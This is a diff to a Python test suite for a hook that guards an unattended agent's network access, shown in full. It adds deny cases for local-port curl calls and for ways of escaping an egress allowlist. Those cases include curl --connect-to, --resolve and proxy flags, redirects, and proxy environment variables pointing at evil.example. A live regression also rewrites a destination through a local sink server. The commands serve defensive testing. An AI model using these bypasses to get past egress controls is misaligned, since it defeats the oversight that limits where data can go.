@@ -23,8 +23,11 @@ the other. That division is the whole lesson of the incident above.
 
 import json
 import os
+import shlex
 import subprocess
 import sys
+import threading
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 
 REPO = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 GUARD = os.path.join(REPO, "hooks", "guard-unattended.py")
@@ -79,12 +82,13 @@ def case(name, payload, expect):
 
 
 # ── 1. KNOWN_HOSTS: the code list still works, including today's additions ────
-# Local inference is port-scoped, never a host-wide allowance. Exercise the
-# hook process, including IPv6 which the former hostname regex skipped.
+# Local inference uses the sanctioned flash-run ask transport, which pins its
+# origin and disables proxies and redirects. A URL cannot vouch for curl,
+# wget or an interpreter's effective destination, even on a model port.
 for host in ("127.0.0.1", "localhost", "[::1]"):
     for port in (8000, 8596):
         case(f"local model {host}:{port}",
-             bash(f"curl -X POST http://{host}:{port}/v1/chat/completions -d '{{}}'"), ALLOW)
+             bash(f"curl -X POST http://{host}:{port}/v1/chat/completions -d '{{}}'"), DENY)
     for port in (22, 80, 443, 5432, 8001, 8597):
         case(f"deny other loopback port {host}:{port}",
              bash(f"curl http://{host}:{port}/"), DENY)
@@ -97,7 +101,64 @@ for host in ("127.0.0.2", "localhost.evil.example", "evil.localhost", "[::2]"):
 case("local model plus unknown remote still denied",
      bash("curl http://127.0.0.1:8000/ https://unknown-egress.example/"), DENY)
 case("local model interpreter send",
-     bash('python3 -c "import urllib.request; urllib.request.urlopen(\'http://127.0.0.1:8000/v1/models\')"'), ALLOW)
+     bash('python3 -c "import urllib.request; urllib.request.urlopen(\'http://127.0.0.1:8000/v1/models\')"'), DENY)
+case("sanctioned local model ask", bash("python3 tools/flash-run.py ask ping --json-object"), ALLOW)
+case("sanctioned ask with inert URL in question",
+     bash("python3 tools/flash-run.py ask 'Describe http://127.0.0.1:8000/'"), ALLOW)
+for escape in (
+    "curl --connect-to 127.0.0.1:8000:evil.example:443 http://127.0.0.1:8000/",
+    "curl --resolve localhost:8000:203.0.113.9 http://localhost:8000/",
+    "curl --noproxy '' --proxy socks5h://evil.example:9999 http://127.0.0.1:8000/",
+    "curl --proxy socks5://evil.example:9999 http://127.0.0.1:8000/",
+    "curl --proxy evil.example:9999 http://127.0.0.1:8000/",
+    "curl -x evil.example:9999 http://127.0.0.1:8000/",
+    "curl --preproxy socks5://evil.example:9999 http://127.0.0.1:8000/",
+    "curl -L http://127.0.0.1:8000/",
+    "curl --location http://127.0.0.1:8000/",
+    "curl --location-trusted http://127.0.0.1:8000/",
+    "curl --config /tmp/curl-destination.conf http://127.0.0.1:8000/",
+    "wget http://localhost:8000/",
+):
+    case(f"deny local transport escape: {escape}", bash(escape), DENY)
+for variable in ("http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"):
+    for prefix in ("", "env ", "echo ready && "):
+        case(f"deny proxy assignment {prefix}{variable}",
+             bash(f"{prefix}{variable}=socks5h://evil.example:9999 curl http://localhost:8000/"), DENY)
+case("deny quoted proxy assignment with another env value",
+     bash("MODE=test http_proxy='http://evil.example:9999' /usr/bin/curl http://localhost:8000/"), DENY)
+case("deny assignment-prefixed remote sender",
+     bash("MODE=test curl https://unknown-egress.example/"), DENY)
+case("assignment-prefixed prose stays inert",
+     bash("MODE=test echo 'curl http://localhost:8000/'"), ALLOW)
+
+
+def scratch_sink_regression():
+    """Prove URL port 8000 can reach another port, then demand hook denial."""
+    hits = []
+    class Sink(BaseHTTPRequestHandler):
+        def do_GET(self):
+            hits.append(self.path)
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"SCRATCH_SINK")
+
+        def log_message(self, *args):
+            pass
+
+    with ThreadingHTTPServer(("127.0.0.1", 0), Sink) as server:
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        try:
+            argv = ["curl", "--silent", "--show-error", "--max-time", "5", "--noproxy", "*",
+                    "--connect-to", f"127.0.0.1:8000:127.0.0.1:{server.server_port}",
+                    "http://127.0.0.1:8000/proof"]
+            result = subprocess.run(argv, capture_output=True, text=True, timeout=10)
+            if result.returncode != 0 or result.stdout != "SCRATCH_SINK" or hits != ["/proof"]:
+                raise AssertionError(f"scratch-sink reproduction failed: {result.returncode}, {hits}")
+            case("deny live scratch-sink destination rewrite", bash(shlex.join(argv)), DENY)
+        finally:
+            server.shutdown()
+            thread.join(timeout=5)
 
 for h in ("https://npiregistry.cms.hhs.gov/api/?version=2.1",
           "https://search.sunbiz.org/Inquiry/CorporationSearch/ByName",
@@ -663,6 +724,7 @@ for _cmd in (
 
 
 def main():
+    scratch_sink_regression()
     verbose = "-v" in sys.argv[1:]
     fails = []
     for name, payload, expect in CASES:
